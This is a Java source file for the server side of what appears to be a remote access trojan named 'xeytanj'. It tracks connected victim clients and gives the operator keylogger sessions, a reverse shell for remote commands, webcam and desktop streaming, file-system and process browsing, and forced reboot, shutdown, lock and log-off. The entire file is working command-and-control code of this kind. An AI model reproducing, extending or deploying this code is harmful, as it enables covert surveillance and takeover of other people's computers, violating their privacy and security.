package com.melardev.xeytanj.services.net.transport.p2p.sync;

import com.melardev.xeytanj.concurrent.communicators.reactive.twoway.worker.AppAndNetCommunicator;
import com.melardev.xeytanj.concurrent.messaging.events.ClientAppEvent;
import com.melardev.xeytanj.enums.Action;
import com.melardev.xeytanj.enums.MediaState;
import com.melardev.xeytanj.enums.Subject;
import com.melardev.xeytanj.errors.UnexpextedStateException;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.net.packets.PacketType;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.ClientController;
import com.melardev.xeytanj.services.net.INetworkClientService;
import com.melardev.xeytanj.services.net.transport.AbstractServerService;
import com.melardev.xeytanj.services.net.transport.p2p.ServerRunnable;
import org.springframework.stereotype.Service;

import javax.swing.*;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

import static com.melardev.xeytanj.net.packets.PacketType.DESKTOP_CONFIG;
import static com.melardev.xeytanj.net.packets.PacketType.SHELL;

@Service
public class P2PSyncTcpServerService extends AbstractServerService {

    private ConcurrentHashMap<UUID, ClientController> clients;

    private IConfigService config;

    private ServerRunnable serverRunnable;
    private ILogger logger;
    private AppAndNetCommunicator appCommunicator;

    public P2PSyncTcpServerService() {
        clients = new ConcurrentHashMap<UUID, ClientController>();
    }

    @Override
    public void startServer() {
        serverRunnable = new ServerRunnable(this, 3002);
        new Thread(serverRunnable).start();
    }

    public void onNewSocketConnection(Socket clientSocket) {
        logger.traceCurrentMethodName();
        ClientController clientController = new ClientController(this, clientSocket, logger, config);
        clients.put(clientController.getClientId(), clientController);
        clientController.interactAsync();
    }

    @Override
    public void pauseCameraStreaming(UUID id) {
        logger.traceCurrentMethodName();
        ClientController clientController = getRemoteClientFromId(id);
        if (clientController == null) return;

        clientController.pauseCameraStreaming();
    }

    @Override
    public void stopCameraSession(UUID id) {
        logger.traceCurrentMethodName();
        ClientController clientController = clients.get(id);
        if (clientController == null)
            return;

        clientController.stopCameraSession();
    }


    @Override
    public void stopProcessMonitor(UUID id) {
        logger.traceCurrentMethodName();
        ClientController rc = clients.get(id);
        if (rc == null)
            return;
        rc.stopProcessMonitor();
    }


    @Override
    public void getFileSystemView(UUID id, String fileSystemPath) {
        logger.traceCurrentMethodName();
        ClientController clientController = getRemoteClientFromId(id);
        if (clientController == null)
            return;

        clientController.getFileSystemView(fileSystemPath);
    }


    @Override
    public void sendChatMessage(UUID uuid, String text) {
        logger.traceCurrentMethodName();
        if (clients.get(uuid) != null)
            clients.get(uuid).getClientContext().getNetClientService().sendChatMessage(text);
    }


    @Override
    public void sendShellCommand(UUID id, String command) {
        logger.traceCurrentMethodName();
        ClientController clientController = clients.get(id);
        if (clientController == null) return;
        clientController.appendExpectedPacket(SHELL);
        clientController.getClientContext().getNetClientService().sendShellCommand(command);
    }


    public void startKeyloggerSession(UUID id) {
        logger.traceCurrentMethodName();
        clients.get(id).startKeyLogSession();
    }


    @Override
    public void startRebootSystem(UUID id) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(id))
            return;
        clients.get(id).startRebootSystem();
    }

    @Override
    public void startShutDownSystem(UUID id) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(id))
            return;
        clients.get(id).startShutDownSystem();
    }

    @Override
    public void startLogOffSystem(UUID id) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(id))
            return;
        clients.get(id).startLogOffSystem();
    }

    @Override
    public void startLockSystem(UUID id) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(id))
            return;
        clients.get(id).startLockSystem();
    }

    @Override
    public void startTurnDisplay(UUID id, boolean on) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(id))
            return;
        clients.get(id).startTurnDisplay(on);
    }

    // ===============================================================================================
    // Net client callbacks
    // ===============================================================================================
    @Override
    public void onClientLoggedIn(Client client) {
        logger.traceCurrentMethodName();
        ClientAppEvent event = new ClientAppEvent(client);
        event.setSubject(Subject.CONNECTION);
        event.setAction(Action.START);

        appCommunicator.queueToAppAsync(event);
        // app.onClientLoggedIn(remote);
    }

    @Override
    public void setCommunicator(AppAndNetCommunicator appAndNetCommunicator) {
        this.appCommunicator = appAndNetCommunicator;
    }

    @Override
    public void onPresentationData(Client client, Map<String, String> env, Map<String, String> props) {

        // if (!remoteClient.isExpectingPacket(PRESENTATION))  return;
        // remoteClient.removeExpectedPacket(PRESENTATION);

        logger.traceCurrentMethodName();

        ClientAppEvent event = new ClientAppEvent(client);
        event.setSubject(Subject.CLIENT_INFORMATION);
        event.setAction(Action.START);
        List<Map<String, String>> list = new ArrayList<>();
        list.add(env);
        list.add(props);
        event.setObject(list);

        appCommunicator.queueToAppAsync(event);
    }

    @Override
    public void onDesktopConfigInfoReceived(Client client, List<ScreenDeviceInfo> screenDeviceInfoList) {
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.DESKTOP_CONFIG, Action.INIT, screenDeviceInfoList));
    }

    @Override
    public void onDesktopImageReceived(Client client, ImageIcon image) {
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.DESKTOP, Action.UPDATE, image));
    }

    private ClientAppEvent buildClientAppEvent(Client client, Subject intent, Action action) {
        return buildClientAppEvent(client, intent, action, null);
    }

    private ClientAppEvent buildClientAppEvent(Client client, Subject intent, Action action, Object object) {
        ClientAppEvent event = new ClientAppEvent(client);
        event.setSubject(intent);
        event.setAction(action);
        event.setObject(object);
        return event;
    }

    @Override
    public void onClientLoginFail(INetworkClientService networkClientService) {
        // This is actually not used, indeed we don't add the client to the table
        // until he succeeds login so does not make sense this code
        logger.traceCurrentMethodName();
        ClientController clientController = getRemoteClientFromNetworkService(networkClientService);
        clients.remove(clientController.getClientId());
    }

    // ======================================
    // Desktop
    // ======================================

    public void onDesktopConfigInfoReceived(ClientController clientController, List<ScreenDeviceInfo> deviceInfoList) {

        if (clientController.isExpectingPacket(DESKTOP_CONFIG) &&
                !clientController.getClientContext().getNetClientService().isStreamingDesktop()) {
            clientController.removeExpectedPacket(DESKTOP_CONFIG);
            logger.traceCurrentMethodName();

            ClientAppEvent netClientEvent = new ClientAppEvent(Subject.DESKTOP_CONFIG, clientController.getClient());
            netClientEvent.setObject(deviceInfoList);
            appCommunicator.queueToAppAsync(netClientEvent);
        }
    }

    public void onDesktopImageReceived(ClientController clientController, ImageIcon image) {
        logger.traceCurrentMethodName();

        ClientAppEvent netClientEvent = new ClientAppEvent(Subject.DESKTOP, clientController.getClient());
        netClientEvent.setObject(image);
        appCommunicator.queueToAppAsync(netClientEvent);
    }

    @Override
    public void onCameraConfigInfoReceived(Client client, List<CameraDeviceInfo> cameras) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.CAMERA, Action.INIT, cameras));
    }

    @Override
    public void onCameraImageReceived(Client client, Icon image) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.CAMERA, Action.UPDATE, image));
    }

    @Override
    public void onFilesystemRootInfoReceived(Client client, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.FILESYSTEM, Action.START, fileInfoStructures));
    }

    @Override
    public void onFileSystemInfoUpdate(Client client, FileInfoStructure[] files) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.FILESYSTEM, Action.UPDATE, files));
    }

    @Override
    public void onProcessInfoReceived(Client client, List<ProcessStructure> processes) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.PROCESS, Action.UPDATE, processes));
    }

    @Override
    public void onClientShellInfoReceived(Client client, String output) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.REVERSE_SHELL, Action.UPDATE, output));
    }

    @Override
    public void onCameraSessionClosed(Client client) {
        logger.traceCurrentMethodName();

        // remoteClient.removeExpectedPacket(CAMERA);
        ClientAppEvent netClientEvent = new ClientAppEvent(client);
        netClientEvent.setAction(Action.STOP);
        netClientEvent.setSubject(Subject.CAMERA);
        appCommunicator.queueToAppAsync(netClientEvent);
    }

    public void onClientDisconnected(ClientController clientController) {
        logger.traceCurrentMethodName();

        clients.remove(clientController.getClientId());

        ClientAppEvent netClientEvent = new ClientAppEvent(clientController.getClient());
        netClientEvent.setAction(Action.STOP);
        netClientEvent.setSubject(Subject.CONNECTION);
        appCommunicator.queueToAppAsync(netClientEvent);
    }

    @Override
    public void onProcessSessionClosed(Client client) {
        logger.traceCurrentMethodName();

        ClientAppEvent netClientEvent = new ClientAppEvent(client);
        netClientEvent.setAction(Action.STOP);
        netClientEvent.setSubject(Subject.PROCESS);
        appCommunicator.queueToAppAsync(netClientEvent);
    }


    public void onKeylogDataReceived(UUID uuid, String logs) {
        logger.traceCurrentMethodName();
    }

    public void onKeylogSessionClosed(Client client) {
        logger.traceCurrentMethodName();


        ClientAppEvent netClientEvent = new ClientAppEvent(client);
        netClientEvent.setAction(Action.STOP);
        netClientEvent.setSubject(Subject.KEYLOGGING);
        appCommunicator.queueToAppAsync(netClientEvent);
    }

    public void onShellSessionClosedByUser(Client client) {
        logger.traceCurrentMethodName();

        // client.removeExpectedPacket(SHELL);

        ClientAppEvent netClientEvent = new ClientAppEvent(client);
        netClientEvent.setAction(Action.STOP);
        netClientEvent.setSubject(Subject.REVERSE_SHELL);
        appCommunicator.queueToAppAsync(netClientEvent);
    }


    public void onCameraAudioPacketReceived(UUID uuid, byte[] data, int bytesRead) {
        logger.traceCurrentMethodName();


    }

    public void onAudioFileReceived(UUID uuid, byte[] data) {

    }

    public void onChatMessageReceived(Client client, String message) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.CHAT, Action.UPDATE, message));
    }

    @Override
    public void onClientDisconnected(Client client) {
        logger.traceCurrentMethodName();
        appCommunicator.queueToAppAsync(buildClientAppEvent(client, Subject.CONNECTION, Action.STOP));
    }


    // =================================================================================================
    // Getters
    // =================================================================================================
    private INetworkClientService getNetClientService(UUID id) {
        if (!clients.containsKey(id))
            return null;
        return clients.get(id).getClientContext().getNetClientService();
    }

    public ClientController getRemoteClientFromId(UUID uuid) {
        logger.traceCurrentMethodName();
        return clients.values().stream().filter(c -> c.getClientId() == uuid)
                .findFirst()
                .orElse(null);
    }

    @Override
    public boolean isClientStreamingDesktop(UUID id) {
        logger.traceCurrentMethodName();
        ClientController client = getRemoteClientFromId(id);
        return client.isStreamingDesktop();
    }


    @Override
    public MediaState getDesktopMediaState(UUID id) {
        logger.traceCurrentMethodName();
        ClientController clientController = getRemoteClientFromId(id);
        //TODO: Handle this better, show a notification saying the user is no longer in active connections
        if (clientController == null)
            return null;
        MediaState state = clientController.getClientContext().getNetClientService().getDesktopMediaState();
        if (state == null)
            return MediaState.STOPPED;
        return state;
    }


    private ClientController getRemoteClientFromNetworkService(INetworkClientService networkClientService) {
        logger.traceCurrentMethodName();
        return clients.values().stream().filter(c -> c.getClientContext().getNetClientService() == networkClientService)
                .findFirst()
                .orElseThrow(UnexpextedStateException::new);
    }


    public ArrayList<Client> getAllClients() {
        logger.traceCurrentMethodName();
        ArrayList<Client> clients = new ArrayList<>();
        Iterator<ClientController> iterator = this.clients.values().iterator();
        while (iterator.hasNext()) {
            ClientController clientController = iterator.next();
            clients.add(clientController.getClient());
        }
        return clients;
    }

    public boolean shouldHandlePacket(PacketType packetType, UUID uuid) {
        ClientController clientController = getRemoteClientFromId(uuid);
        return clientController.isExpectingPacket(packetType);
    }

    // =================================================================================================
    // Setters
    // =================================================================================================
    @Override
    public void setConfig(IConfigService configService) {
        this.config = configService;
    }


    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }


    // =================================================================================================
    // Server related methods
    // =================================================================================================
    @Override
    public void stopServer() {
        logger.traceCurrentMethodName();
        serverRunnable.setHasToRun(false);
    }

    public void onNewSocketConnection(ClientController client) {
        clients.put(client.getClientId(), client);
    }
}
